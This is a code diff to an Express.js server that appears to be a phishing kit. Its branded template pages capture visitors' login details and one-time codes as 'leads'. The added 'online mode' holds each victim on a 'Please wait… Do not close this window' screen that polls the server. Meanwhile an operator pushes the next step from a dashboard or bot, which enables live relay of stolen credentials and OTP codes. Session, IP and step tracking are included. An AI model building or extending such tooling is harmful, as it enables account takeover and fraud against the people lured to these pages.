@@ -166,15 +166,6 @@ app.get('/p/:slug/:pageSlug?', (req, res) => {
     const targetSlug = pageSlug || defaultSlug;
     const pageContent = tpl.pages.find(p => p.slug === targetSlug) || tpl.pages[0];
 
-    // offline mode: show static locked/complete page immediately
-    if (page.mode === 'offline' && targetSlug === defaultSlug) {
-      return res.render('locked', {
-        page, tpl,
-        pageContent: { headline: 'Service Temporarily Unavailable', subheadline: 'Please try again later.', slug: 'locked', form_type: 'locked', fields: [], cta: '' },
-        allPages: tpl.pages, logos: LOGOS
-      });
-    }
-
     // only increment views on first page
     if (!pageSlug || pageSlug === defaultSlug) {
       db.prepare('UPDATE pages SET views = views + 1 WHERE id = ?').run(page.id);
@@ -221,6 +212,74 @@ ${lines}`;
   }
 }
 
+// ── ONLINE MODE HELPER ────────────────────────────────────────
+// In online mode: after saving lead, show a "please wait" page
+// instead of auto-redirecting. Admin pushes next step via dashboard/bot.
+function holdOrRedirect(page, tpl, nextPage, currentStepSlug, sid, req, res) {
+  if (page.mode === 'online') {
+    // update visitor record so admin sees current step
+    if (sid) {
+      db.prepare(`
+        INSERT INTO visitors (session_id, page_id, page_title, current_step, ip, last_seen)
+        VALUES (?,?,?,?,?,datetime('now'))
+        ON CONFLICT(session_id) DO UPDATE SET current_step=excluded.current_step, last_seen=excluded.last_seen
+      `).run(sid, page.id, page.title, currentStepSlug, req.ip || '');
+    }
+    // show waiting screen — visitor polls every 2s for pending_step from admin
+    return res.send(buildWaitPage(page.slug, sid || '', tpl, currentStepSlug));
+  }
+  // auto/offline mode: redirect immediately to next step
+  if (!nextPage) return res.redirect(`/p/${page.slug}/complete`);
+  res.redirect(`/p/${page.slug}/${nextPage.slug}`);
+}
+
+function buildWaitPage(slug, sid, tpl, currentStep) {
+  const bg  = tpl?.palette?.bg     || '#0b0f19';
+  const fg  = tpl?.palette?.fg     || '#eef2ff';
+  const acc = tpl?.palette?.accent || '#5b8cff';
+  const safeSid  = String(sid  || '').replace(/['"\\<>]/g, '');
+  const safeSlug = String(slug || '').replace(/['"\\<>]/g, '');
+  const safeStep = String(currentStep || 'login').replace(/['"\\<>]/g, '');
+  const safeBg   = String(bg).replace(/['"\\<>]/g, '');
+  return `<!doctype html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Please Wait</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:${safeBg};color:${fg.replace(/['"\\<>]/g,'')};
+     min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:24px}
+.spinner{width:48px;height:48px;border:3px solid ${acc.replace(/['"\\<>]/g,'')}33;border-top-color:${acc.replace(/['"\\<>]/g,'')};
+         border-radius:50%;animation:spin .9s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.msg{font-size:.95rem;opacity:.6;text-align:center;max-width:260px;line-height:1.6}
+</style></head><body>
+<div class="spinner"></div>
+<div class="msg">Please wait&#8230;<br><span style="font-size:.78rem;opacity:.5">Do not close this window</span></div>
+<script>
+var SID='${safeSid}', SLUG='${safeSlug}', STEP='${safeStep}';
+function poll(){
+  fetch('/p/'+SLUG+'/poll?sid='+encodeURIComponent(SID))
+    .then(function(r){return r.json()})
+    .then(function(d){
+      if(d.step){
+        var url;
+        if(d.step==='HOME'||d.step==='home') url='/p/'+SLUG;
+        else if(d.step==='NEXT') url='/p/'+SLUG+'/next?_sid='+encodeURIComponent(SID);
+        else url='/p/'+SLUG+'/'+encodeURIComponent(d.step);
+        window.location.href=url;
+      } else { setTimeout(poll,2000); }
+    }).catch(function(){setTimeout(poll,3000)});
+}
+function heartbeat(){
+  fetch('/p/'+SLUG+'/heartbeat',{method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({sid:SID,step:STEP}),keepalive:true}).catch(function(){});
+}
+heartbeat(); setInterval(heartbeat,5000); setTimeout(poll,1000);
+</script>
+</body></html>`;
+}
+
 app.post('/p/:slug/login', async (req, res) => {
   try {
     const page = db.prepare('SELECT * FROM pages WHERE slug = ? AND active = 1').get(req.params.slug);
@@ -235,17 +294,21 @@ app.post('/p/:slug/login', async (req, res) => {
     const tpl = getTemplate(page.template_id);
     await saveLead(page, tpl, 'login', req.body, req);
 
-    // find next step after login
     const nextPage = getNextPage(tpl, 'login');
-    if (!nextPage) return res.redirect(`/p/${page.slug}/complete`);
 
-    // if next step is OTP, generate and store code
+    // in online mode: hold visitor, wait for admin push
+    if (page.mode === 'online') {
+      const sid = req.body._sid || '';
+      return holdOrRedirect(page, tpl, nextPage, 'login', sid, req, res);
+    }
+
+    // auto mode: generate OTP if needed, redirect
+    if (!nextPage) return res.redirect(`/p/${page.slug}/complete`);
     if (nextPage.layout === 'otp') {
       const code = generateOTP(nextPage.otp_length || 6);
       storeOTP(page.id, req.ip, code);
       console.log(`✅ OTP for ${page.slug}: ${code}`);
     }
-
     res.redirect(`/p/${page.slug}/${nextPage.slug}`);
   } catch (err) {
     console.error('Login error:', err.message);
@@ -259,13 +322,11 @@ app.post('/p/:slug/verify', async (req, res) => {
     if (!page) return res.status(404).send('not found');
 
     const tpl = getTemplate(page.template_id);
-    // use _step from form to identify which OTP page was submitted
     const submittedStep = req.body._step;
     const otpPage = tpl.pages.find(p => p.slug === submittedStep && p.layout === 'otp')
                  || tpl.pages.find(p => p.layout === 'otp');
     const otpSlug = otpPage?.slug || submittedStep || 'verify';
 
-    // validate OTP
     const result = verifyOTP(page.id, req.ip, req.body.code);
     if (!result.valid) {
       const pageContent = otpPage || { headline: 'أدخل الكود', subheadline: 'بعتنا كود تحقق', fields: ['code'], layout: 'otp', cta: 'تأكيد', otp_length: 6, slug: otpSlug };
@@ -274,17 +335,19 @@ app.post('/p/:slug/verify', async (req, res) => {
 
     await saveLead(page, tpl, otpSlug, req.body, req);
 
-    // find next step after this specific OTP step
     const nextPage = getNextPage(tpl, otpSlug);
-    if (!nextPage) return res.redirect(`/p/${page.slug}/complete`);
+    const sid = req.body._sid || '';
 
-    // if the next step is also OTP, generate a new code for it
+    if (page.mode === 'online') {
+      return holdOrRedirect(page, tpl, nextPage, otpSlug, sid, req, res);
+    }
+
+    if (!nextPage) return res.redirect(`/p/${page.slug}/complete`);
     if (nextPage.layout === 'otp') {
       const newCode = generateOTP(nextPage.otp_length || 6);
       storeOTP(page.id, req.ip, newCode);
       console.log(`✅ OTP for ${page.slug}/${nextPage.slug}: ${newCode}`);
     }
-
     res.redirect(`/p/${page.slug}/${nextPage.slug}?verified=1`);
   } catch (err) {
     console.error('OTP verify error:', err.message);
@@ -303,8 +366,14 @@ app.post('/p/:slug/step/:stepSlug', async (req, res) => {
 
     await saveLead(page, tpl, stepSlug, req.body, req);
 
-    // if next step is OTP, generate code
     const nextPage = getNextPage(tpl, stepSlug);
+    const sid = req.body._sid || '';
+
+    if (page.mode === 'online') {
+      return holdOrRedirect(page, tpl, nextPage, stepSlug, sid, req, res);
+    }
+
+    // if next step is OTP, generate code
     if (nextPage?.layout === 'otp') {
       const code = generateOTP(nextPage.otp_length || 6);
       storeOTP(page.id, req.ip, code);
